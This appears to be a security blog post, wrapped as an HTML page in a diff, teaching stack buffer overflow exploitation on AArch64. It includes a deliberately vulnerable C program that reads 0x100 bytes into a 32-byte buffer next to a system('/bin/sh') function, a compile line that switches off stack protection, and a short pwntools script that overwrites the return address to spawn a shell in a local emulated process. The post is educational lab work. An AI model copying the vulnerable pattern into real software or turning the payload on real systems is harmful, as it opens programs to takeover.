@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[AArch64] Buffer OverFlow · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ The concept of Buffer OverFlow can be found at the link below. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ Please let me know if there is anything wrong. I will edit it after checking.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/aarch64-buffer-overflow/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/aarch64-buffer-overflow/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/aarch64-buffer-overflow/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[AArch64] Buffer OverFlow · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ The concept of Buffer OverFlow can be found at the link below. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ Please let me know if there is anything wrong. I will edit it after checking."><meta property="og:url" content="https://whrds.github.io/en/posts/aarch64-buffer-overflow/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[AArch64] Buffer OverFlow","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ The concept of Buffer OverFlow can be found at the link below. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ Please let me know if there is anything wrong. I will edit it after checking.","datePublished":"2024-03-20","inLanguage":"en","url":"https://whrds.github.io/en/posts/aarch64-buffer-overflow/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/aarch64-buffer-overflow/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[AArch64] Buffer OverFlow</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ The concept of Buffer OverFlow can be found at the link below. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ Please let me know if there is anything wrong. I will edit it after checking.</p><div class="article-meta"><time datetime="2024-03-20">Mar 20, 2024</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong> </p>
+<p>The concept of Buffer OverFlow can be found at the link below.</p>
+<p><a href="https://whrdud727.tistory.com/5">https://whrdud727.tistory.com/5</a></p>
+<p> [[PWNABLE]Stack Buffer OverFlow</p>
+<p>※ If there are any mistakes, please let us know. We will check and correct it. ※ Buffer OverFlow is divided into Stack Buffer OverFlow and Heap Buffer OverFlow depending on the area in which it occurs. Heap will be discussed next</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/5">https://whrdud727.tistory.com/5</a>)</p>
+<p><a href="https://whrdud727.tistory.com/6">https://whrdud727.tistory.com/6</a></p>
+<p> [[PWNABLE]Return Address Overwrite</p>
+<p>※ If there are any mistakes, please let us know. We will check and correct it. ※ I briefly discussed Buffer OverFlow in the last post. This time, the ret part located in the Stack Frame, which modulates the Stack,</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/6">https://whrdud727.tistory.com/6</a>)</p>
+<p>Although the attack principle is the same, caution must be taken because the stack structure is different from the existing x86_64.</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/001.png" alt=""></p>
+<p>The left is x86_64, the right is AArch64. The address of ret is at the top of the stack, not at the end.</p>
+<p>To reinterpret this, it means that only main() exists and that if a BOF vulnerability occurs within it, it cannot be attacked.</p>
+<hr>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void initial(){
+	setvbuf(stdin, 0, 2, 0);
+	setvbuf(stdout, 0, 2, 0);
+	setvbuf(stderr, 0, 2, 0);
+}
+
+void shell(){
+	system(&quot;/bin/sh&quot;);
+}
+
+void vuln(){
+	char buf[32];
+	printf(&quot;Exploit\n&quot;);
+	read(0, buf, 0x100);
+	printf(&quot;%s\n&quot;, buf);
+}
+
+int main(){
+	char test[0x20];
+	initial();
+	vuln();;
+
+	return 0;
+}
+</code></pre>
+<p>This is a C language code that provides system(‘/bin/sh’); as a gift.</p>
+<p>If you look at vuln(), you can see that a BOF vulnerability occurs when entering the buf variable.</p>
+<pre><code>aarch64-linux-gnu-gcc -no-pie -fno-stack-protector bof.c
+</code></pre>
+<p>Compile in the same way as above.</p>
+<p>Perform debugging using the method used in the link below.</p>
+<p><a href="https://whrdud727.tistory.com/34">https://whrdud727.tistory.com/34</a></p>
+<p> [[AArch64] x86_64 Simple comparison</p>
+<p>※ If there are any mistakes, please let us know. We will check and correct it. ※ This architecture is designed for efficient power use and high performance. Mainly used in environments such as smartphones and embedded systems</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/34">https://whrdud727.tistory.com/34</a>)</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/002.png" alt=""></p>
+<p>’</p>
+<p>Looking at vuln(), -32 is calculated for sp, and in read(), the value is entered into the variable at a distance of 24 from sp.</p>
+<p>In other words, out of the stack size of 32, only 24 is used.</p>
+<p>The remaining 8 correspond to sfp.</p>
+<p>This can be expressed simply as follows:</p>
+<pre><code>vuln()
+[ret_sp-32] - [stack_sp-24] - [bp]
+main()
+[ret] - [stack_sp] - [bp]
+</code></pre>
+<p>Now that we have checked the size of buf, let’s enter the value.</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/003.png" alt=""></p>
+<p>Starting with the space of vuln(), ret of main() was overwritten.</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/004.png" alt=""></p>
+<p>x30 is the part that contains the ret address.</p>
+<p>I will write the payload right away.</p>
+<pre><code>from pwn import *
+
+context.log_level = 'debug'
+p = process(['qemu-aarch64-static','a.out'])
+e = ELF('a.out')
+shell = e.sym['shell']#0x00000000004007ac
+
+payload = b'A'*0x28
+payload += p64(shell)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/005.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/aarch64-buffer-overflow/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
